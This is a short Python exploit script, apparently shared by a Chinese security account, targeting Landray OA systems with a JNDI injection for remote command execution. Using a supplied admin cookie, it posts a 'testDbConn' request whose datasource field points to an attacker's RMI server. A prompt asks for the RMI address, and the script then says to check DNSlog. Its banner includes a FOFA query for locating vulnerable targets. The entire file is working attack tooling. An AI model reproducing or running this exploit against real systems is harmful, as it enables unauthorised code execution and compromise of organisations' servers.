# app="Landray-OA系统"
import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings()

def banner():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m蓝凌OA JNDI远程命令执行    \033[0m                       +')
    print('+ \033[1;36m公众号：bgbing安全\033[0m                                +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36mpython3 xxx.py -u/--url http://xxx.xxx.xxx.xxx\033[0m    +')
    print('+ \033[1;36mfofa 语句：app="Landray-OA系统"           \033[0m        +')
    print('+---------------------------------------------------+')
if len(sys.argv)==1:
    banner()
    sys.exit()
parser = argparse.ArgumentParser(description='bgbingfofaapi help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
args=parser.parse_args()
url=args.url
if url!="":
    first=url+"/admin.do?method=config"
    cookie=input("cookie >>>")
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie":cookie
            }
    r=requests.session()
    response=r.get(url=first,headers=header,verify=False,timeout=10)
    if '系统配置' in response.text:
        print("\033[1;36m登录成功\033[0m")
        rmi=input("rmi >>>")
        second=url+"/admin.do"
        data="method=testDbConn&datasource="+rmi
        response=r.post(url=second,headers=header,data=data,verify=False,timeout=10)    
        print("\033[1;36m看一下dnslog情况\033[0m")
    else:
        print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m")
